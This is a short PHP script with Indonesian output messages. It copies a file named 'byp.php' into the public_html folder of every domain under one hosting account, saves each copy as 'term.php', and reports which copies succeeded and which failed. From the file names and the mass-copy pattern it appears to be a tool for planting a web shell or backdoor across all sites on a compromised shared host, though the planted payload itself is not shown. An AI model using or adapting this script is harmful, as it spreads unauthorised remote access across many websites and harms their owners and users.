<?php

$source  = __DIR__ . '/byp.php';
$baseDir = '/home/u817626328/domains/';

if (!file_exists($source)) {
    die('File sumber tidak ditemukan');
}

$success = [];
$failed  = [];

foreach (glob($baseDir . '/*/public_html') as $publicHtml) {
    $target = $publicHtml . '/term.php';

    if (@copy($source, $target)) {
        $success[] = $target;
    } else {
        $failed[] = $target;
    }
}

echo "<h3>✅ Berhasil dipaste:</h3>";
if ($success) {
    echo "<ul>";
    foreach ($success as $s) {
        echo "<li>$s</li>";
    }
    echo "</ul>";
} else {
    echo "Tidak ada yang berhasil.<br>";
}

echo "<h3>❌ Gagal:</h3>";
if ($failed) {
    echo "<ul>";
    foreach ($failed as $f) {
        echo "<li>$f</li>";
    }
    echo "</ul>";
} else {
    echo "Tidak ada kegagalan.";
}
